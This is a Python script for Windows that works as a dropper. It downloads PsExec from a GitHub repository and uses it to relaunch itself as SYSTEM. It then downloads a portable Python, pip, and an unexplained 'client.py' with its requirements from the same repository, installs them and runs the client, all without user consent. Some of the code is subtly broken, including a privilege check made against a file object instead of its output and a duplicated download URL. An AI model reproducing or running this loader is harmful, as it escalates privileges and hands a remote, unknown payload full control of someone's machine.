import urllib3
import os
import sys
from zipfile import ZipFile

def download_client():
	url = "https://github.com/Ccgnnz19/shekksl/raw/main/client.py"
	http = urllib3.PoolManager()
	req = http.request("GET", url, preload_content=False)
	data = req.read()
	open("C:\\temp\\client.py","wb").write(data)
	url = "https://github.com/Ccgnnz19/shekksl/raw/main/req.txt"
	req = http.request("GET", url,preload_content=False)
	data = req.read()
	open("req.txt", "wb").write(data)
	os.popen("C:\\temp\\python3.exe -m pip install -r req.txt")

def download_ps():
	url_ps_exec = "https://github.com/Ccgnnz19/shekksl/raw/main/PsExec.exe"
	url_ps_exec64 = "https://github.com/Ccgnnz19/shekksl/raw/main/PsExec.exe"
	http = urllib3.PoolManager()
	req1 = http.request("GET", url_ps_exec, preload_content=False)
	req2 = http.request("GET", url_ps_exec64, preload_content=False)
	data1 = req1.read()
	data2 = req2.read()
	fla = open("PsExec.exe", "wb").write(data1)
	flb = open("PsExec64.exe", "wb").write(data2)

def down_python():
	os.popen("mkdir C:\\temp")
	http = urllib3.PoolManager()
	url = "https://github.com/Ccgnnz19/shekksl/raw/main/python.zip"
	req = http.request("GET", url, preload_content=False)
	data = req.read()
	fl = open("C:\\temp\\python.zip","wb").write(data)
	zp = ZipFile("C:\\temp\\python.zip", "r")
	try:
		zp.extractall(path="C:\\temp\\")
	except:
		zp.extractall(path="C:\\temp")
	req = http.request("GET", "https://bootstrap.pypa.io/get-pip.py", preload_content=False)
	data = req.read()
	open("C:\\temp\\get_pip.py", "wb").write(data)
	os.popen("C:\\temp\\python3.exe C:\\temp\\get_pip.py")

def main():
	usr = os.popen("whoami")
	if "system" in usr:
		down_python()
		download_client()
		os.popen("C:\\temp\\python3.exe client.py")
	else:
		download_ps()
		name = sys.argv[0]
		dir_act = os.getcwd()
		if "'" in dir_act:
			dir_act.replace("'","")
		try:
			print("1")
			os.popen(f"{dir_act}/PsExec.exe -i -accepteula -s {dir_act}\\{name}")
			input("")
		except:
			print("2")
			os.popen(f"{dir_act}/PsExec64.exe -i -accepteula -s {dir_act}\\{name}")
			input("")

main()